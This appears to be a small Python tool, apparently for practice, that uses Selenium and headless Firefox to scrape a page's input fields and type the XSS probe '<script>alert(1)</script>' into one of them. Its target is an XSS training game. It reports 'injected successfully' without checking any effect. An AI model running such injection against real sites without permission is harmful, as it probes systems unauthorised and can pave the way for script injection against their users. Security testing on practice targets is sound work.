from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from Scraper import Scraper
import time


class Injector:
    def __init__(self, url, mydriver):
        self.url = url
        self.driver = mydriver

    def inject_script(self, input_field_names):
        try:
            self.driver.get(self.url)
            time.sleep(5)
            input_field = self.driver.find_element(By.NAME, input_field_names[0])
            input_field.clear()
            input_field.send_keys("<script>alert(1)</script>")

            """for field_name in input_field_names:
                input_field = self.driver.find_element(By.NAME, field_name)
                input_field.clear()  # Clear if any prev data is there
                input_field.send_keys("<script>alert(1)</script>")
                # Add code here that'll see what happens after injecting the alert(1)"""

            print("[+] - Script injected successfully!")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            self.driver.quit()


if __name__ == "__main__":
    target_url: str = "https://xss-game.appspot.com/level1"

    firefox_options: Options = Options()
    firefox_options.add_argument("--headless")  # Screen size check by JS
    my_driver: webdriver = webdriver.Firefox(options=firefox_options)

    my_scraper = Scraper(target_url, my_driver)

    injector: Injector = Injector(target_url, my_driver)

    # get input fields' names => Inject script in all of them one by one
    input_fields = my_scraper.scrape_input_fields()
    print(f"fields: {input_fields}")
    injector.inject_script(input_fields)
